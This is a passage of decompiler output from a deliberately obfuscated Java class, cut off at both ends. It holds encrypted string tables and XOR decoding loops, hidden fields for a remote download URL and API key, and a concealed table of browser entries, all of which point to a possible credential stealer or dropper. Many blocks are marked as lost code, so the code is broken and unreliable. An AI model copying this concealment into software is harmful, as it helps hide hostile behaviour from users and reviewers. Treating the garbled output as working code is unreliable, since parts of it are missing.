                        (StringBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(StringBuilder.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((StringBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(StringBuilder.class, Object.class, Long.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((StringBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(StringBuilder.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((StringBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(StringBuilder.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((StringBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(StringBuilder.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((StringBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(StringBuilder.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(r12, r03, -9182886778774712853L, a3) /* invoke-custom */, m69a(1868271780 - 12239, (-1868271780) - (-30633), (int) a3), -9182886778774712853L, a3) /* invoke-custom */, (String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(r0, -9173998726918810642L, a3) /* invoke-custom */, -9182886778774712853L, a3) /* invoke-custom */, m69a(1868271780 - 12215, 37028 - ((char) (-29326)), (int) a3), -9182886778774712853L, a3) /* invoke-custom */, (long) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Long.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(r0, -9170964295772075793L, a3) /* invoke-custom */ / m71b(12271, 8989943502670699215L ^ a3), -9180000361880886192L, a3) /* invoke-custom */, m69a(1868271780 - 12319, 1868271780 - 4308, (int) a3), -9182886778774712853L, a3) /* invoke-custom */;
                    }
                } catch (RuntimeException unused3) {
                    throw r03;
                }
            } catch (RuntimeException unused4) {
                throw r0;
            }
        }
    }

    @Override // dev.azad1337.p001IlIillIliIlIi.InterfaceC0005T
    /* renamed from: I */
    public String mo50I(Object[] a) {
        return m69a(746312580 + 317, 746312580 - 10592, (int) ((Long) a[0]).longValue());
    }

    /* JADX WARN: Code restructure failed: missing block: B:10:0x014c, code lost:
    
        if (r3 != 0) goto L60;
     */
    /* JADX WARN: Code restructure failed: missing block: B:11:0x014f, code lost:
    
        r3 = r2;
        r4 = r1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:13:0x0129, code lost:
    
        r6 = '.';
     */
    /* JADX WARN: Code restructure failed: missing block: B:14:0x012e, code lost:
    
        r6 = '$';
     */
    /* JADX WARN: Code restructure failed: missing block: B:15:0x0133, code lost:
    
        r6 = 19;
     */
    /* JADX WARN: Code restructure failed: missing block: B:16:0x0138, code lost:
    
        r6 = 28;
     */
    /* JADX WARN: Code restructure failed: missing block: B:17:0x013d, code lost:
    
        r6 = '#';
     */
    /* JADX WARN: Code restructure failed: missing block: B:18:0x0142, code lost:
    
        r6 = 20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:19:0x0154, code lost:
    
        r3 = r1;
        r2 = r2;
        r1 = r3;
     */
    /* JADX WARN: Code restructure failed: missing block: B:20:0x0158, code lost:
    
        if (r3 > r33) goto L15;
     */
    /* JADX WARN: Code restructure failed: missing block: B:21:0x015b, code lost:
    
        r0 = new java.lang.String(r2).intern();
     */
    /* JADX WARN: Code restructure failed: missing block: B:22:0x0169, code lost:
    
        switch(r0) {
            case 0: goto L9;
            default: goto L4;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:23:0x003c, code lost:
    
        r3 = r30;
        r30 = r30 + 1;
        r0[r3] = r0;
        r1 = r27 + r28;
        r27 = r1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:24:0x0050, code lost:
    
        if (r1 >= r31) goto L7;
     */
    /* JADX WARN: Code restructure failed: missing block: B:25:0x005f, code lost:
    
        r29 = "³é?Ý\u001fµ\u0099þi\u009bD«Co'e×s¦\u007fÑJ[L\u000b>?Ué\u008eÛ:a÷ñÉË´xá\u0013k\u0003lWù\u0018öeçþ\u0097ÔÁ";
        r31 = "³é?Ý\u001fµ\u0099þi\u009bD«Co'e×s¦\u007fÑJ[L\u000b>?Ué\u008eÛ:a÷ñÉË´xá\u0013k\u0003lWù\u0018öeçþ\u0097ÔÁ".length();
        r28 = 14;
        r27 = -1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:30:0x0083, code lost:
    
        r4 = r30;
        r30 = r30 + 1;
        r0[r4] = r0;
        r2 = r27 + r28;
        r27 = r2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:31:0x0097, code lost:
    
        if (r2 >= r31) goto L56;
     */
    /* JADX WARN: Code restructure failed: missing block: B:32:0x009a, code lost:
    
        r28 = r29.charAt(r27);
     */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x00a6, code lost:
    
        dev.azad1337.p001IlIillIliIlIi.impl.C0006G.f25b = r0;
        dev.azad1337.p001IlIillIliIlIi.impl.C0006G.f26c = new java.lang.String[126];
        dev.azad1337.p001IlIillIliIlIi.impl.C0006G.CDN_API_URL = m69a(1323354623, 1323351669, (int) 81521450887670L);
        dev.azad1337.p001IlIillIliIlIi.impl.C0006G.CDN_DOWNLOAD_BASE = m69a(1323354533, 1323359284, (int) 81521450887670L);
        dev.azad1337.p001IlIillIliIlIi.impl.C0006G.CDN_API_KEY = m69a(1323354540, -1323366032, (int) 81521450887670L);
     */
    /* JADX WARN: Code restructure failed: missing block: B:36:0x017c, code lost:
    
        r2 = new long[13];
        r22 = 0;
        r23 = "ªZ]ÃiÌF>\u0086\u0097Ï\u008cÂ4©ëþ¶7\u001a4Ï¤]Ó\u0005´êiö1\u001fh\u000bk\u0085\u0095e\u008bt8v§\u0091\u001cDïf\u008d\u008fLpQÐ$æÅ·¬Â4\u0097yÆ{íæ\u001f\u0081®e\nF\nZT/E\u0007ÆN\u001dÅ\u000f}ÔÆB";
        r24 = "ªZ]ÃiÌF>\u0086\u0097Ï\u008cÂ4©ëþ¶7\u001a4Ï¤]Ó\u0005´êiö1\u001fh\u000bk\u0085\u0095e\u008bt8v§\u0091\u001cDïf\u008d\u008fLpQÐ$æÅ·¬Â4\u0097yÆ{íæ\u001f\u0081®e\nF\nZT/E\u0007ÆN\u001dÅ\u000f}ÔÆB".length();
        r21 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:37:0x0193, code lost:
    
        r3 = r21;
        r21 = r21 + 8;
        r2 = r23.substring(r3, r21).getBytes("ISO-8859-1");
        r3 = r22;
        r5 = -1;
        r4 = ((((((((r2[0] & 255) << 56) | ((r2[1] & 255) << 48)) | ((r2[2] & 255) << 40)) | ((r2[3] & 255) << 32)) | ((r2[4] & 255) << 24)) | ((r2[5] & 255) << 16)) | ((r2[6] & 255) << 8)) | (r2[7] & 255);
        r22 = r22 + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:38:0x02cb, code lost:
    
        r6 = r5;
        r5 = r4;
        r4 = r3;
        r5 = r5 ^ 81521450887670L;
     */
    /* JADX WARN: Code restructure failed: missing block: B:39:0x02d2, code lost:
    
        switch(r4) {
            case 0: goto L38;
            default: goto L34;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:40:0x0218, code lost:
    
        r6[r5] = r4;
     */
    /* JADX WARN: Code restructure failed: missing block: B:41:0x021d, code lost:
    
        if (r21 < r24) goto L62;
     */
    /* JADX WARN: Code restructure failed: missing block: B:42:0x0220, code lost:
    
        r23 = "8\u0011cE[Ôïþ¿\u001fÚË´Z]\u001e";
        r24 = "8\u0011cE[Ôïþ¿\u001fÚË´Z]\u001e".length();
        r21 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:44:0x022e, code lost:
    
        r4 = r21;
        r21 = r21 + 8;
        r3 = r23.substring(r4, r21).getBytes("ISO-8859-1");
        r3 = r2;
        r4 = r22 == true ? 1 : 0;
        r5 = ((((((((r3[0] & 255) << 56) | ((r3[1] & 255) << 48)) | ((r3[2] & 255) << 40)) | ((r3[3] & 255) << 32)) | ((r3[4] & 255) << 24)) | ((r3[5] & 255) << 16)) | ((r3[6] & 255) << 8)) | (r3[7] & 255);
        r22 = (r22 == true ? 1 : 0) + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:46:0x02b3, code lost:
    
        r5[r4] = r5;
     */
    /* JADX WARN: Code restructure failed: missing block: B:47:0x02b8, code lost:
    
        if (r21 < r24) goto L64;
     */
    /* JADX WARN: Code restructure failed: missing block: B:49:0x02bb, code lost:
    
        dev.azad1337.p001IlIillIliIlIi.impl.C0006G.f27d = r2;
        dev.azad1337.p001IlIillIliIlIi.impl.C0006G.f28e = new java.lang.Integer[13];
     */
    /* JADX WARN: Code restructure failed: missing block: B:4:0x00f0, code lost:
    
        if (r2 <= 1) goto L15;
     */
    /* JADX WARN: Code restructure failed: missing block: B:50:0x02e4, code lost:
    
        r4 = new long[6];
        r16 = 0;
        r17 = "|Âü8\u0002?7Ò,\u009e«[¾\u0016dË:ìõL\u0091\u0085H\u0016\u000b)Ö¶Û:\u0003p";
        r18 = "|Âü8\u0002?7Ò,\u009e«[¾\u0016dË:ìõL\u0091\u0085H\u0016\u000b)Ö¶Û:\u0003p".length();
        r15 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x02f7, code lost:
    
        r5 = r15;
        r15 = r15 + 8;
        r4 = r17.substring(r5, r15).getBytes("ISO-8859-1");
        r5 = r16;
        r7 = -1;
        r6 = ((((((((r4[0] & 255) << 56) | ((r4[1] & 255) << 48)) | ((r4[2] & 255) << 40)) | ((r4[3] & 255) << 32)) | ((r4[4] & 255) << 24)) | ((r4[5] & 255) << 16)) | ((r4[6] & 255) << 8)) | (r4[7] & 255);
        r16 = r16 + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:52:0x0420, code lost:
    
        r8 = r7;
        r7 = r6;
        r6 = r5;
        r7 = r7 ^ 81521450887670L;
     */
    /* JADX WARN: Code restructure failed: missing block: B:53:0x0427, code lost:
    
        switch(r6) {
            case 0: goto L49;
            default: goto L45;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:54:0x0378, code lost:
    
        r8[r7] = r6;
     */
    /* JADX WARN: Code restructure failed: missing block: B:55:0x037b, code lost:
    
        if (r15 < r18) goto L66;
     */
    /* JADX WARN: Code restructure failed: missing block: B:56:0x037e, code lost:
    
        r17 = "L\u0004Ü5\u007fâCÝ\u0012Éjn\f\u009b(\u001a";
        r18 = "L\u0004Ü5\u007fâCÝ\u0012Éjn\f\u009b(\u001a".length();
        r15 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:58:0x0389, code lost:
    
        r6 = r15;
        r15 = r15 + 8;
        r5 = r17.substring(r6, r15).getBytes("ISO-8859-1");
        r5 = r4;
        r6 = r16 == true ? 1 : 0;
        r7 = ((((((((r5[0] & 255) << 56) | ((r5[1] & 255) << 48)) | ((r5[2] & 255) << 40)) | ((r5[3] & 255) << 32)) | ((r5[4] & 255) << 24)) | ((r5[5] & 255) << 16)) | ((r5[6] & 255) << 8)) | (r5[7] & 255);
        r16 = (r16 == true ? 1 : 0) + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:5:0x00f3, code lost:
    
        r3 = r2;
        r4 = r33;
     */
    /* JADX WARN: Code restructure failed: missing block: B:60:0x040a, code lost:
    
        r7[r6] = r7;
     */
    /* JADX WARN: Code restructure failed: missing block: B:61:0x040d, code lost:
    
        if (r15 < r18) goto L68;
     */
    /* JADX WARN: Code restructure failed: missing block: B:63:0x0410, code lost:
    
        dev.azad1337.p001IlIillIliIlIi.impl.C0006G.f29f = r4;
        dev.azad1337.p001IlIillIliIlIi.impl.C0006G.f30g = new java.lang.Long[6];
     */
    /* JADX WARN: Code restructure failed: missing block: B:64:0x0438, code lost:
    
        dev.azad1337.p001IlIillIliIlIi.impl.C0006G.BROWSERS = new java.util.LinkedHashMap();
        call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "B"}
            {METHOD_TYPE: (Ljava/lang/Object;, Ljava/lang/Object;, Ljava/lang/Object;, J, J)Ljava/lang/Object;}
        ).invoke(call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "Ë"}
            {METHOD_TYPE: (J, J)Ljava/util/Map;}
        ).invoke(3004809359896300866L, 81521450887670L), m69a(45342 - ((char) (-6344)), (-1323282720) + (-((char) (-2127))), (int) 81521450887670L), new dev.azad1337.p001IlIillIliIlIi.impl.C0006G.d(m69a(45342 - ((char) (-6368)), 45342 - ((char) (-2880)), (int) 81521450887670L), m69a(45342 - ((char) (-6353)), (-1323413790) - (-((char) (-17599))), (int) 81521450887670L), m69a(45342 - ((char) (-6322)), (-1323413790) - (-((char) (-350))), (int) 81521450887670L), r1, m69a(45342 - ((char) (-6294)), (-1323282720) + (-((char) (-4436))), (int) 81521450887670L), m69a(45342 - ((char) (-6347)), 45342 - ((char) (-4721)), (int) 81521450887670L)), 3004189969691703974L, 81521450887670L);
        call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "B"}
            {METHOD_TYPE: (Ljava/lang/Object;, Ljava/lang/Object;, Ljava/lang/Object;, J, J)Ljava/lang/Object;}
        ).invoke(call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "Ë"}
            {METHOD_TYPE: (J, J)Ljava/util/Map;}
        ).invoke(3004809359896300866L, 81521450887670L), m69a(45342 - ((char) (-6367)), (-1323282720) + (-((char) (-8886))), (int) 81521450887670L), new dev.azad1337.p001IlIillIliIlIi.impl.C0006G.d(m69a(45342 - ((char) (-6284)), 45344 + ((char) (-11506)), (int) 81521450887670L), m69a(45342 - ((char) (-6289)), (-1323282720) + (-((char) (-4630))), (int) 81521450887670L), m69a(45342 - ((char) (-6309)), (-1323282720) + (-((char) (-8622))), (int) 81521450887670L), r1, m69a(45342 - ((char) (-6311)), (-1323413790) - (-((char) (-16035))), (int) 81521450887670L), m69a(45342 - ((char) (-6304)), 45342 - ((char) (-16651)), (int) 81521450887670L)), 3004189969691703974L, 81521450887670L);
        call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "B"}
            {METHOD_TYPE: (Ljava/lang/Object;, Ljava/lang/Object;, Ljava/lang/Object;, J, J)Ljava/lang/Object;}
        ).invoke(call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "Ë"}
            {METHOD_TYPE: (J, J)Ljava/util/Map;}
        ).invoke(3004809359896300866L, 81521450887670L), m69a(45342 - ((char) (-6251)), (-1323413790) - (-((char) (-18994))), (int) 81521450887670L), new dev.azad1337.p001IlIillIliIlIi.impl.C0006G.d(m69a(45342 - ((char) (-6278)), (-1323413790) - (-((char) (-14099))), (int) 81521450887670L), m69a(45342 - ((char) (-6289)), (-1323282720) + (-((char) (-4630))), (int) 81521450887670L), m69a(45342 - ((char) (-6300)), (-1323413790) - (-((char) (-944))), (int) 81521450887670L), r1, m69a(45342 - ((char) (-6272)), (-1323413790) - (-((char) (-18409))), (int) 81521450887670L), m69a(45342 - ((char) (-6335)), (-1323282720) + (-((char) (-471))), (int) 81521450887670L)), 3004189969691703974L, 81521450887670L);
        call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "B"}
            {METHOD_TYPE: (Ljava/lang/Object;, Ljava/lang/Object;, Ljava/lang/Object;, J, J)Ljava/lang/Object;}
        ).invoke(call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "Ë"}
            {METHOD_TYPE: (J, J)Ljava/util/Map;}
        ).invoke(3004809359896300866L, 81521450887670L), m69a(45342 - ((char) (-6346)), (-1323282720) + (-((char) (-1575))), (int) 81521450887670L), new dev.azad1337.p001IlIillIliIlIi.impl.C0006G.d(m69a(45342 - ((char) (-6361)), (-1323413790) - (-((char) (-17629))), (int) 81521450887670L), m69a(45342 - ((char) (-6289)), (-1323282720) + (-((char) (-4630))), (int) 81521450887670L), m69a(45342 - ((char) (-6245)), 45342 - ((char) (-11795)), (int) 81521450887670L), r1, m69a(45342 - ((char) (-6257)), 45342 - ((char) (-18483)), (int) 81521450887670L), m69a(45342 - ((char) (-6362)), 45342 - ((char) (-18861)), (int) 81521450887670L)), 3004189969691703974L, 81521450887670L);
        call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "B"}
            {METHOD_TYPE: (Ljava/lang/Object;, Ljava/lang/Object;, Ljava/lang/Object;, J, J)Ljava/lang/Object;}
        ).invoke(call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "Ë"}
            {METHOD_TYPE: (J, J)Ljava/util/Map;}
        ).invoke(3004809359896300866L, 81521450887670L), m69a(45342 - ((char) (-6334)), 45344 + ((char) (-6195)), (int) 81521450887670L), new dev.azad1337.p001IlIillIliIlIi.impl.C0006G.d(m69a(45342 - ((char) (-6336)), 45342 - ((char) (-14631)), (int) 81521450887670L), m69a(45342 - ((char) (-6289)), (-1323282720) + (-((char) (-4630))), (int) 81521450887670L), m69a(45342 - ((char) (-6252)), (-1323413790) - (-((char) (-14814))), (int) 81521450887670L), r1, m69a(45342 - ((char) (-6270)), 45342 - ((char) (-14350)), (int) 81521450887670L), m69a(45342 - ((char) (-6259)), (-1323413790) - (-((char) (-19672))), (int) 81521450887670L)), 3004189969691703974L, 81521450887670L);
        call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "B"}
            {METHOD_TYPE: (Ljava/lang/Object;, Ljava/lang/Object;, Ljava/lang/Object;, J, J)Ljava/lang/Object;}
        ).invoke(call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "Ë"}
            {METHOD_TYPE: (J, J)Ljava/util/Map;}
        ).invoke(3004809359896300866L, 81521450887670L), m69a(45342 - ((char) (-6318)), 45342 - ((char) (-15135)), (int) 81521450887670L), new dev.azad1337.p001IlIillIliIlIi.impl.C0006G.d(m69a(45342 - ((char) (-6325)), (-1323413790) - (-((char) (-4007))), (int) 81521450887670L), m69a(45342 - ((char) (-6289)), (-1323282720) + (-((char) (-4630))), (int) 81521450887670L), m69a(45342 - ((char) (-6315)), (-1323413790) - (-((char) (-6905))), (int) 81521450887670L), r1, m69a(45342 - ((char) (-6364)), (-1323413790) - (-((char) (-19232))), (int) 81521450887670L), m69a(45342 - ((char) (-6260)), 45342 - ((char) (-4888)), (int) 81521450887670L)), 3004189969691703974L, 81521450887670L);
        call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "B"}
            {METHOD_TYPE: (Ljava/lang/Object;, Ljava/lang/Object;, Ljava/lang/Object;, J, J)Ljava/lang/Object;}
        ).invoke(call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "Ë"}
            {METHOD_TYPE: (J, J)Ljava/util/Map;}
        ).invoke(3004809359896300866L, 81521450887670L), m69a(45342 - ((char) (-6296)), 45342 - ((char) (-6289)), (int) 81521450887670L), new dev.azad1337.p001IlIillIliIlIi.impl.C0006G.d(m69a(45342 - ((char) (-6323)), 45342 - ((char) (-8640)), (int) 81521450887670L), m69a(45342 - ((char) (-6298)), (-1323413790) - (-((char) (-16335))), (int) 81521450887670L), m69a(45342 - ((char) (-6287)), (-1323282720) + (-((char) (-3609))), (int) 81521450887670L), r1, null, m69a(45342 - ((char) (-6328)), 45342 - ((char) (-15525)), (int) 81521450887670L)), 3004189969691703974L, 81521450887670L);
     */
    /* JADX WARN: Code restructure failed: missing block: B:65:0x08b5, code lost:
    
        return;
     */
    /* JADX WARN: Code restructure failed: missing block: B:6:0x00f6, code lost:
    
        r5 = r3[r4];
     */
    /* JADX WARN: Code restructure failed: missing block: B:7:0x00fd, code lost:
    
        switch((r33 % 7)) {
            case 0: goto L18;
            case 1: goto L19;
            case 2: goto L20;
            case 3: goto L21;
            case 4: goto L22;
            case 5: goto L23;
            default: goto L24;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:8:0x0124, code lost:
    
        r6 = 'W';
     */
    /* JADX WARN: Code restructure failed: missing block: B:9:0x0144, code lost:
    
        r3[r4] = (char) (r5 ^ r6);
        r33 = r33 + 1;
        r3 = r1;
        r2 = r2;
        r1 = r3;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r16v0 */
    /* JADX WARN: Type inference failed for: r16v1, types: [int] */
    /* JADX WARN: Type inference failed for: r16v3 */
    /* JADX WARN: Type inference failed for: r16v63 */
    /* JADX WARN: Type inference failed for: r16v64 */
    /* JADX WARN: Type inference failed for: r1v31 */
    /* JADX WARN: Type inference failed for: r1v4 */
    /* JADX WARN: Type inference failed for: r1v5 */
    /* JADX WARN: Type inference failed for: r22v0 */
    /* JADX WARN: Type inference failed for: r22v1, types: [int] */
    /* JADX WARN: Type inference failed for: r22v3 */
    /* JADX WARN: Type inference failed for: r22v7 */
    /* JADX WARN: Type inference failed for: r22v8 */
    /* JADX WARN: Type inference failed for: r4v26 */
    /* JADX WARN: Type inference failed for: r4v27 */
    /* JADX WARN: Type inference failed for: r4v45 */
    /* JADX WARN: Type inference failed for: r4v54 */
    /* JADX WARN: Type inference failed for: r5v39 */
    /* JADX WARN: Type inference failed for: r5v40 */
    /* JADX WARN: Type inference failed for: r5v42, types: [long] */
    /* JADX WARN: Type inference failed for: r5v76 */
    /* JADX WARN: Type inference failed for: r6v119 */
    /* JADX WARN: Type inference failed for: r6v20 */
    /* JADX WARN: Type inference failed for: r6v36 */
    /* JADX WARN: Type inference failed for: r6v37 */
    /* JADX WARN: Type inference failed for: r6v67 */
    /* JADX WARN: Type inference failed for: r7v37 */
    /* JADX WARN: Type inference failed for: r7v38 */
    /* JADX WARN: Type inference failed for: r7v40, types: [long] */
    /* JADX WARN: Type inference failed for: r7v85 */
    /* JADX WARN: Type inference failed for: r8v20 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:19:0x0158 -> B:5:0x00f3). Please report as a decompilation issue!!! */
    static {
        int i;
        long j = 81521450887670L ^ 58050271960671L;
        String[] strArr = new String[126];
        int i2 = 0;
        String str = "��\u0017\u0004\u0093x>\u009c\u0005Ãyù³\u008f\r\u009di\u0018°j«µ¢bs\"Ú\u008c\b³\u007f_5Û\u0084Æo\nÙFPg< µ\u009b\u0089\u0011\b\t\u007f,5µû+0\u0004e\u0007ç´%Si½Á0Á½\u00ad\u001aÃ3\u0003Dæ\u001dÈ\u00ad*ÃêRäY\u000b÷¨X\u001e¤ËÀÀi!ÿ¯\u007f\u0007è\u008b/\u0086'7¡\u0005\u0090G;2W\u0007\u001f Ç÷´\u0096\u0089\bpa'öÔ\u0083'\u001f<ùo{uÑ\u0088\u00835ª\u0015\u0089k\u0097RmâØ³\u0085ün\u0089æ¿«åq\"; \u0086ÔBò}\u008c%Y[¥\u0091udI³\u0003\u0081Èßoï\u000fñg./@ètÿ\u000bß:í°\u007fñª¡ëi\u0007\u0004\u0097?A\u0018\u0003��À\u001f\u001bV´&\u0011=\u00992\u009e0£}V)N7í\u0015ñÊ!Þ\u0099±\u007fÁG×\u009eî1\u0007\u0086&Æ3\u001a\u0081\u00062\tÀæ)¯Þ6\u0090cyu3|]ëãÔMD\u0007¾}RâV³\u0099¹\u0088¢Î(»q¿ú'+\u000fÍÂÏ\u0089tNð\u007fz¢>\u0007\u009bós\u008d\"Ù['\u00807ÏºèR¸+\u0012\u0005õþ,Ñ¡Üß\u0081Kí^HF\b¿\u001d Â\u0015oÖ\u001f\u0013\u0093OöT\u0090º\u0003x\u0001\u0004\u0006úaìðT¸94îÂEæ\u008eeõv\r\u0012hä2\u0003î\u00152<ÌY\u008f��\u007fwýê!H@èØ\u008fsÄ¼\u0012_½eKzâO\u000b\u0082\u0093\u008f\fh{¦ò½ãOõ\b\u0004,Cm\u009a\u009e/\u0006@ÜùÝ¤GÒY\u0019ÿ\u0012ÃR3\u0092²Ù`¤±RáØ\u001a\u0090\u0092«\u001a+´âÞ ÇiªTJøÃ\f'Ðç%©:\u0085\u0098Î\u008e8ýðµ¶oµ\n÷ÈÉ\"&É3$MSEíQ\u0006¿m\u0081ÝK\u0099ï£ôÑ\u0002\u008aê`1V5\u0087Õ\u0099M\u008b Ô\u0088*ÅYqâ«{\u0011A r\f\u001a82>\u0094L\u0012\u0007÷@þû\u0093\u0017m?´LAe¯UN?d\u0091üI½¯'üA\u0003\u0098Ê\"5\u001eµ\u008eÅ¸O¯àP\u0080ºÄKQ ¯3\u0091H0S\u000e>x¶6\u0004M��Á×\u0018\u001dwó/\u0002c\u0080£¯\u001egûÏ½\u008bÓ2`b\u0010ïÓ\u0092oMA&?ÿ\u0080f\u0004fK1\u0096Ã\b¬\u008d-!\u00995÷¡SV\u0095æ\u009a}\u0012§ûEþen\u0092Éf/dl\u0019w\u0084\u0090J²\u0086õõ´\u0092I\u000b+7\u001bÊX/\u001f\u0007\tÝ%\u0092~b\u009có3~\u001cºý`fÿÇ@I\\®sÏ\u0003n\u0013¨(é]ö?ãà\u0093Ã\"øÒ+Á\u0093ï\u009ez*ôÐ3l\u0016öàX\u0098\u00197ÐªrJÉôSÒ\u009dò\\(\u009fç\u0083e\u0089\u009dá|\u009fë;d~\u0097\n\u00995g\u001f\u0090ßjÄ\u0004ë\u0005'+\u0093@\\\u0005m\f,\u001d5\rj&C÷\u001eQ\u0095\u0093Rå\u0096ut'j3\u0092:CBÍ)¼E 